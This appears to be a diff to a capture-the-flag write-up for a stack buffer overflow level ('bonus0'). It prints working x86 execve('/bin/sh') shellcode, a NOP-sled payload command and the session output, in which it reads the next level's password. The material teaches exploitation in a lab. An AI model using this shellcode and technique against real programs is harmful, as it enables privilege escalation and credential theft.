@@ -69,13 +69,17 @@ Level1 could jump straight to an existing `run()` that called `system("/bin/sh")
 
 We aim the overwritten return address at a spot *inside* the sled, not at the shellcode's first byte, because we cannot pin down `buffer`'s address to the exact byte: gdb's own environment (its extra variables, the absolute path used to invoke the program) shifts the stack slightly compared to a plain shell invocation. A `\x90` (NOP, "do nothing") sled means landing anywhere in that region just slides down, one no-op at a time, until execution reaches the real shellcode. That is the entire reason the sled exists: it turns "guess the exact address" into "guess somewhere in a 100-byte window."
 
-### Shellcode (28 bytes)
+### Shellcode (45 bytes)
 
-execve(`/bin/sh`), same Aleph One family as level2, with `ecx`/`edx` zeroed by register copy:
+The only real requirement here is **no null bytes**: `*strchr(buffer,'\n') = 0` treats `buffer` as a C string, so a null byte anywhere before our trailing `\n` makes `strchr` stop early and return `NULL`, and `*NULL = 0` segfaults before the shellcode ever runs. Length doesn't matter, `buffer` is 4096 bytes, our sled plus shellcode use a tiny fraction of that.
+
+This is the same classic Aleph One `jmp`/`call`/`pop` execve(`/bin/sh`) shellcode used in level9: `jmp` past a `call`, the `call` pushes the address of the `"/bin/sh"` string that sits right after it, `pop` grabs that address, then it builds a real `argv = [ptr, NULL]` and `envp = [NULL]` before the `execve` syscall:
 
 ```
-\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
 ```
+
+(A shorter 28-byte variant, from the same family, also works here, it just passes `argv=NULL, envp=NULL` to `execve` instead of building real arrays. Both are null-byte free and both were confirmed live against the real target; the choice between them is style, not correctness.)
 
 ### Finding a real address for the sled
 
@@ -103,11 +107,11 @@ Both methods agree: **`buffer = 0xbfffec30`** in this session. Aim into the sled
 
 ### Run
 
-- input 1: 100 NOPs + 28-byte shellcode (= 128 bytes, fits in `buffer`).
+- input 1: 100 NOPs + 45-byte shellcode (= 145 bytes, fits in `buffer`).
 - input 2: 9 pad + 4-byte return address + 7 filler (= 20 bytes, matching offset 9 found above).
 
 ```bash
-$ (python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A"*9 + "\x6c\xec\xff\xbf" + "B"*7'; cat) | ./bonus0
+$ (python -c 'print "\x90"*100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'; python -c 'print "A"*9 + "\x6c\xec\xff\xbf" + "B"*7'; cat) | ./bonus0
  - 
  - 
 id
@@ -115,6 +119,8 @@ uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(
 cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 ```
+
+The target address (`0xbfffec6c`, buffer+60) doesn't change when swapping shellcode: it depends only on `argv`/`envp`, which stayed the same, not on what we send over stdin.
 
 The euid flip to `bonus1` confirms the shellcode actually ran `execve("/bin/sh", ...)`, not just that `main` crashed somewhere convenient.
 
